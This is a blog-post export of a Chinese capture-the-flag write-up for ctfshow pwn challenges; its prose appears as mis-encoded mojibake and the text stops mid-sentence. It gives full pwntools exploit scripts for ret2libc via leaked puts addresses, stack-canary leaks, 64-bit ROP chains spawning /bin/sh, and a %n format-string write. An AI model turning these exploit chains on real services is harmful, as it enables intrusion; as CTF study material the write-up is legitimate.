{"title":"ctfshow-pwn","uid":"52662f34cef48ec0871eed4c3bef0137","slug":"ctfshow-pwn","date":"2021-10-17T09:55:50.000Z","updated":"2021-11-06T02:20:32.088Z","comments":true,"path":"api/articles/ctfshow-pwn.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/ctwdE4PqChNIpzb.jpg","content":"<h1 id=\"pwn03\"><a href=\"#pwn03\" class=\"headerlink\" title=\"pwn03\"></a>pwn03</h1><p>å°†é™„ä»¶æ‹–è¿›IDAä¸­å¾ˆå®¹æ˜“å‘ç°å­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ä»¥åŠsystemå‡½æ•°ï¼Œä¹Ÿä¸èƒ½åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨<img src=\"https://i.loli.net/2021/10/16/SdbDYyzAl3TumcV.png\" alt=\"image.png\"></p>\n<p>æ‰€ä»¥å‡½æ•°åœ°å€æ³„éœ²è·å¾—libcç‰ˆæœ¬æ¥è·å¾—systemå‡½æ•°åœ°å€ä»è€Œè·å¾—shellã€‚å…·ä½“æ­¥éª¤ï¼š</p>\n<ul>\n<li>æ³„éœ² putsåœ°å€</li>\n<li>è·å– libc ç‰ˆæœ¬</li>\n<li>è·å– system åœ°å€ä¸ /bin/sh çš„åœ°å€</li>\n<li>å†æ¬¡æ‰§è¡Œæºç¨‹åº</li>\n<li>è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜/bin/shâ€™)</li>\n</ul>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28015</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./stack1&#x27;</span>)</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]       <span class=\"comment\"># è·å–putsçš„plt</span></span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]           <span class=\"comment\"># è·å–putsçš„got</span></span><br><span class=\"line\">start_addr = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]          <span class=\"comment\"># è·å–ç¨‹åºå¼€å§‹åœ°å€</span></span><br><span class=\"line\">payload1 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">13</span>,puts_plt,start_addr,puts_got])         <span class=\"comment\"># æ³„éœ²putsçš„gotåœ°å€</span></span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\n\\n&#x27;</span>)         <span class=\"comment\"># è¿™é‡Œè€½è¯¯äº†å¥½ä¹…ï¼Œå› ä¸ºè¦è¯»å–æ‰ä¸¤ä¸ªæ¢è¡Œç¬¦ï¼Œä¸ç„¶åé¢è·å–åœ°å€å°±ä¼šå‡ºé”™</span></span><br><span class=\"line\">libc_puts_addr = u32(p.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])          <span class=\"comment\"># æ¥æ”¶æ³„éœ²çš„åœ°å€</span></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)        <span class=\"comment\"># æ‰¾åˆ°å¯¹åº”çš„libc</span></span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)         <span class=\"comment\"># è®¡ç®—åŸºåœ°å€</span></span><br><span class=\"line\">sys_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)         <span class=\"comment\"># ç®—å‡ºsystemå‡½æ•°çš„åœ°å€</span></span><br><span class=\"line\">bin_sh = libcbase+libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">13</span>,sys_addr,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">4</span>,bin_sh])</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn04\"><a href=\"#pwn04\" class=\"headerlink\" title=\"pwn04\"></a>pwn04</h1><p>ç”¨idaæ‰“å¼€å‘ç°å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡ºå¹¶ä¸”è¿˜å­˜åœ¨åé—¨å‡½æ•°<img src=\"https://i.loli.net/2021/10/16/YkhGbwR5uyam1Np.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-16 181459.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/16/odXSjLRgc1mpGra.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-16 181732.png\"></p>\n<p>checksecæŸ¥çœ‹å‘ç°å­˜åœ¨canaryä¿æŠ¤ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯ç»•è¿‡canaryä¿æŠ¤è¿›å…¥åé—¨å‡½æ•°ä»è€Œè·å–shell</p>\n<p>é€šè¿‡IDAæŸ¥çœ‹å¯ä»¥å‘ç°canaryåœ¨ebp-cçš„ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬ä¸€è½®è¾“å…¥æ¥æ³„éœ²canary</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Hello Hacker!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">a = p.recvline()</span><br><span class=\"line\">canary = p.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><strong>å› ä¸ºå­˜åœ¨å›æ˜¾æ‰€ä»¥è¦å°†å›æ˜¾æ¥æ”¶ä¸ç„¶canaryå°±ä¼šå‡ºé”™ï¼Œå·²ç»è¸©å‘</strong></p>\n<p><img src=\"https://i.loli.net/2021/10/16/Wof2tuehQjwRYgx.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-16 182347.png\"></p>\n<p>è·å–äº†canaryæ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡canaryè¿›å…¥åé—¨å‡½æ•°</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span>,canary,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>,get_shell])</span><br><span class=\"line\">p.sendline(payload2)</span><br></pre></td></tr></table></figure>\n\n<p><strong>å› ä¸ºcanaryæ˜¯å››ä¸ªå­—èŠ‚ï¼Œè€Œåˆ°è¿”å›åœ°å€è¿˜éœ€è¦0x70-0x64-4=8ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦è¡¥å……8ä¸ªå­—èŠ‚</strong></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><p>exp1:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28132</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./ex2&#x27;)</span></span><br><span class=\"line\">get_shell = <span class=\"number\">0x80485AF</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Hello Hacker!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">a = p.recvline()</span><br><span class=\"line\">canary = p.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\">payload2 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span>,canary,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>,get_shell])</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>exp2ï¼š</p>\n<p>ä¹Ÿæ˜¯é€šè¿‡printfæ³„éœ²ï¼Œä¸è¿‡æ˜¯é€šè¿‡è®¡ç®—canaryåˆ°printfçš„åç§»æ¥æ³„éœ²</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./ex&quot;)</span></span><br><span class=\"line\">p =remote(<span class=\"string\">&quot;111.231.70.44&quot;</span>,<span class=\"number\">28097</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">leak_canary = <span class=\"string\">&quot;%31$x&quot;</span></span><br><span class=\"line\">p.sendline(leak_canary)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(p.recv(),<span class=\"number\">16</span>)</span><br><span class=\"line\">print(<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\">getshell = <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">100</span> + p32(canary) + <span class=\"string\">b&quot;b&quot;</span> * <span class=\"number\">12</span> + p32(<span class=\"number\">0x0804859B</span>)</span><br><span class=\"line\">p.sendline(getshell)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn07\"><a href=\"#pwn07\" class=\"headerlink\" title=\"pwn07\"></a>pwn07</h1><p>æ‰“å¼€å‘ç°æ˜¯64ä½ç¨‹åºï¼Œåˆ†æä¸€ä¸‹å‘ç°pwn03åšæ³•ç›¸åŒï¼Œæ³„éœ²å‡½æ•°åœ°å€ä»è€Œè·å–libcç‰ˆæœ¬æ‰¾åˆ°systemå‡½æ•°è¿›è€Œè·å–shellã€‚åœ¨æŸäº›ç»†èŠ‚ä¸Šè¿˜æ˜¯æœ‰ç‚¹ä¸åŒï¼Œ32ä½æ˜¯é€šè¿‡æ ˆä¼ é€’å‚æ•°ï¼Œè€Œ64ä½æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°(å½“å‚æ•°å°äº7ä¸ªæ—¶ï¼Œå‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨rdi,rsi,rdx,rcx,r8,r9)ï¼Œæ‰€ä»¥æ‰§è¡Œsystem(â€œbin/shâ€)æ—¶rdiå¯„å­˜å™¨è¦å­˜å‚¨çš„æ˜¯bin/shå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼š</p>\n<p>æ³„éœ²putså‡½æ•°éœ€è¦å…ˆå°†putsçš„gotè¡¨åœ°å€ä¼ é€’åˆ°rdiå¯„å­˜å™¨ä¸­åœ¨è·³è½¬åˆ°putså‡½æ•°è¾“å‡º</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br></pre></td></tr></table></figure>\n\n<p>åœ¨æ‰§è¡Œsystemå‡½æ•°æ—¶ä¸ä»…è¦è®°ä½é€šè¿‡rdiä¼ å‚è¿˜è¦æ³¨æ„å †æ ˆå¯¹é½ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>\n\n<p>p64(ret_addr)ç›®çš„ç”¨äºå †æ ˆå¯¹é½ï¼Œä¸ç„¶åé¢ä¼šæŠ¥é”™ã€‚</p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28138</span>)</span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x04006e3</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x0004006E4</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn1&#x27;</span>)</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">start_addr = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\x0a&#x27;</span>)</span><br><span class=\"line\">libc_puts_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)</span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">sys_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">bin_sh = libcbase+libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn10\"><a href=\"#pwn10\" class=\"headerlink\" title=\"pwn10\"></a>pwn10</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%a  æµ®ç‚¹æ•°ã€åå…­è¿›åˆ¶æ•°å­—å’Œp-è®°æ•°æ³•ï¼ˆc99</span><br><span class=\"line\">%A  æµ®ç‚¹æ•°ã€åå…­è¿›åˆ¶æ•°å­—å’Œp-è®°æ³•ï¼ˆc99ï¼‰</span><br><span class=\"line\">%c  ä¸€ä¸ªå­—ç¬¦(char)</span><br><span class=\"line\">%C  ä¸€ä¸ªISOå®½å­—ç¬¦</span><br><span class=\"line\">%d  æœ‰ç¬¦å·åè¿›åˆ¶æ•´æ•°(int)ï¼ˆ%ldã€%Ldï¼šé•¿æ•´å‹æ•°æ®(long),%hdï¼šè¾“å‡ºçŸ­æ•´å½¢ã€‚ï¼‰ã€€</span><br><span class=\"line\">%e  æµ®ç‚¹æ•°ã€e-è®°æ•°æ³•</span><br><span class=\"line\">%E  æµ®ç‚¹æ•°ã€E-è®°æ•°æ³•</span><br><span class=\"line\">%f  å•ç²¾åº¦æµ®ç‚¹æ•°(é»˜è®¤float)ã€åè¿›åˆ¶è®°æ•°æ³•ï¼ˆ%.nf  è¿™é‡Œnè¡¨ç¤ºç²¾ç¡®åˆ°å°æ•°ä½ånä½.åè¿›åˆ¶è®¡æ•°ï¼‰</span><br><span class=\"line\">%g  æ ¹æ®æ•°å€¼ä¸åŒè‡ªåŠ¨é€‰æ‹©%fæˆ–%eï¼</span><br><span class=\"line\">%G  æ ¹æ®æ•°å€¼ä¸åŒè‡ªåŠ¨é€‰æ‹©%fæˆ–%e.</span><br><span class=\"line\">%i  æœ‰ç¬¦å·åè¿›åˆ¶æ•°ï¼ˆä¸%dç›¸åŒï¼‰</span><br><span class=\"line\">%nï¼šå°†%nä¹‹å‰printfå·²ç»æ‰“å°çš„å­—ç¬¦ä¸ªæ•°èµ‹å€¼ç»™åç§»å¤„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ä½ç½®</span><br><span class=\"line\">%o  æ— ç¬¦å·å…«è¿›åˆ¶æ•´æ•°</span><br><span class=\"line\">%p  æŒ‡é’ˆ</span><br><span class=\"line\">%s  å¯¹åº”å­—ç¬¦ä¸²char*ï¼ˆ%s &#x3D; %hs &#x3D; %hS è¾“å‡º çª„å­—ç¬¦ï¼‰</span><br><span class=\"line\">%S  å¯¹åº”å®½å­—ç¬¦ä¸²WCAHR*ï¼ˆ%ws &#x3D; %S è¾“å‡ºå®½å­—ç¬¦ä¸²ï¼‰</span><br><span class=\"line\">%u  æ— ç¬¦å·åè¿›åˆ¶æ•´æ•°(unsigned int)</span><br><span class=\"line\">%x  ä½¿ç”¨åå…­è¿›åˆ¶æ•°å­—0xfçš„æ— ç¬¦å·åå…­è¿›åˆ¶æ•´æ•°ã€€</span><br><span class=\"line\">%X  ä½¿ç”¨åå…­è¿›åˆ¶æ•°å­—0xfçš„æ— ç¬¦å·åå…­è¿›åˆ¶æ•´æ•°</span><br><span class=\"line\">%%  æ‰“å°ä¸€ä¸ªç™¾åˆ†å· </span><br><span class=\"line\">%I64d ç”¨äºINT64 æˆ–è€… long long</span><br><span class=\"line\">%I64u ç”¨äºUINT64 æˆ–è€… unsigned long long</span><br><span class=\"line\">%I64x ç”¨äº64ä½16è¿›åˆ¶æ•°æ®</span><br><span class=\"line\">%m.n : mæŒ‡åŸŸå®½ï¼Œå³å¯¹åº”çš„è¾“å‡ºé¡¹åœ¨è¾“å‡ºè®¾å¤‡ä¸Šæ‰€å çš„å­—ç¬¦æ•°ã€‚næŒ‡ç²¾åº¦ã€‚ç”¨äºè¯´æ˜è¾“å‡ºçš„å®å‹æ•°çš„å°æ•°ä½æ•°ã€‚ä¸ºæŒ‡å®šnæ—¶ï¼Œéšå«çš„ç²¾åº¦ä¸ºn&#x3D;6ä½ã€‚</span><br><span class=\"line\">l å¯¹æ•´å‹æŒ‡longå‹ï¼Œå¯¹å®å‹æŒ‡doubleå‹ã€‚hç”¨äºå°†æ•´å‹çš„æ ¼å¼å­—ç¬¦ä¿®æ­£ä¸ºshortå‹ã€‚</span><br></pre></td></tr></table></figure>\n\n<p>æ‰“å¼€åå‘ç°å½“num==16æ—¶å°±å¯ä»¥å¾—åˆ°flagï¼Œä½†æ˜¯æ²¡æœ‰æ ˆæº¢å‡ºå¯ä»¥è¦†ç›–numçš„å€¼ã€‚ä»”ç»†è§‚å¯Ÿï¼Œè¿™é‡Œè¾“å‡ºç”¨çš„æ˜¯printfå‡½æ•°å­˜åœ¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨%nå»ä¿®æ”¹numï¼Œé¦–å…ˆéœ€è¦numçš„åœ°å€ï¼Œå…¶æ¬¡éœ€è¦ä¸€ä¸ªå‚æ•°æŒ‡å‘numã€‚é€šè¿‡å‘ç°æˆ‘ä»¬å¯ä»¥çœ‹åˆ°scanfå¯¹formatèµ‹å€¼äº†ä¸¤æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆå°†numçš„åœ°å€èµ‹ç»™formatï¼Œæ¥ä¸‹æ¥ä½¿ç”¨%næ¥ä¿®æ”¹formatæŒ‡å‘numçš„å€¼</p>\n<p><img src=\"https://i.loli.net/2021/10/26/hMP7uoKZlkewSvn.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-26 092828.png\"></p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28101</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./pwn10&quot;)</span></span><br><span class=\"line\">num_addr = <span class=\"number\">0x0804A030</span></span><br><span class=\"line\">payload = p32(num_addr)+<span class=\"string\">&quot;aaaaaaaaaaaa%7$n&quot;</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"èŒæ–°èµ›-ç­¾åˆ°é¢˜\"><a href=\"#èŒæ–°èµ›-ç­¾åˆ°é¢˜\" class=\"headerlink\" title=\"èŒæ–°èµ›-ç­¾åˆ°é¢˜\"></a>èŒæ–°èµ›-ç­¾åˆ°é¢˜</h1><p>å°±æ˜¯ç®€å•çš„libcæ³„éœ²ã€‚è®¡ç®—ä¸€ä¸‹srcçš„åç§»ï¼Œæ‰¾åˆ°ç›¸åº”gadgetæ³„éœ²å‡½æ•°åœ°å€åœ¨è·å¾—libcçš„ç‰ˆæœ¬è·å–systemå‡½æ•°å’Œå­—ç¬¦ä¸²bin/shåœ°å€ï¼Œæœ€åç»„è£…ä¸€ä¸‹å°±è¡Œ</p>\n<p><img src=\"https://i.loli.net/2021/10/26/6IxpjB9mK4WbrRO.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-26 124355.png\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./pwn_check_in&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;pwn_check_in&#x27;</span>)</span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">start_addr=elf.symbols[<span class=\"string\">&quot;_start&quot;</span>]</span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x400793</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x40053e</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x78</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;[+] command successful!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;hhh,just a joke&#x27;</span>)</span><br><span class=\"line\">puts_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;puts&quot;</span>,puts_addr)</span><br><span class=\"line\">libcbase=puts_addr-libc.dump(<span class=\"string\">&quot;puts&quot;</span>)</span><br><span class=\"line\">system_addr=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x78</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;[+] command successful!\\n&#x27;</span>,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"å†…éƒ¨èµ›-ç­¾åˆ°é¢˜\"><a href=\"#å†…éƒ¨èµ›-ç­¾åˆ°é¢˜\" class=\"headerlink\" title=\"å†…éƒ¨èµ›-ç­¾åˆ°é¢˜\"></a>å†…éƒ¨èµ›-ç­¾åˆ°é¢˜</h1><p>æ­¤é¢˜ä¸ret2csuåšæ³•ç›¸åŒï¼Œå› ä¸ºæ²¡æœ‰putså‡½æ•°ä½†æ˜¯å­˜åœ¨writeå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡å–ç»„è£…writeå‡½æ•°æ¥æ³„éœ²åœ°å€ï¼Œä»è€Œè·å–systemå‡½æ•°ä»¥åŠbin/shåœ°å€ã€‚</p>\n<p><img src=\"https://i.loli.net/2021/10/26/DlpyIGKWCtjqRVQ.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-26 201620.png\"></p>\n<p>gadgetså’Œret2csué‡Œé¢çš„æœ‰ç‚¹ä¸ä¸€æ ·ä½†æ˜¯å¤§è‡´æ˜¯ä¸€æ 